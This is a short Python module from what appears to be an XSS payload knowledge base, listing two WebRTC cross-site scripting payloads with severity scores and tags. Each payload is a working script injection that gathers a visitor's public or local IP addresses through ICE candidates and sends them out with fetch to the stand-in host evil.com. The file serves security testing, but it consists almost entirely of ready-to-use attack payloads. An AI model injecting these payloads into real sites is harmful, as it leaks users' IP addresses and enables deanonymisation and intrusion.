#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

WebRTC API XSS Payloads
"""

from ..models import PayloadEntry


WEBRTC_PAYLOADS = {
    "webrtc_1": PayloadEntry(
        payload="<script>var r=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});r.createDataChannel('');r.createOffer().then(o=>r.setLocalDescription(o));r.onicecandidate=e=>{if(e.candidate)fetch('//evil.com/?ip='+e.candidate.candidate)}</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="WebRTC IP leak",
        tags=["webrtc", "ip", "leak"],
        reliability="high",
    ),
    "webrtc_2": PayloadEntry(
        payload="<script>var r=new RTCPeerConnection();r.createDataChannel('');r.onicecandidate=e=>{if(e.candidate){var ip=e.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3})/);if(ip)fetch('//evil.com/?ip='+ip[1])}};r.createOffer().then(o=>r.setLocalDescription(o))</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="WebRTC local IP extract",
        tags=["webrtc", "ip", "local"],
        reliability="high",
    ),
}

WEBRTC_PAYLOADS_TOTAL = len(WEBRTC_PAYLOADS)
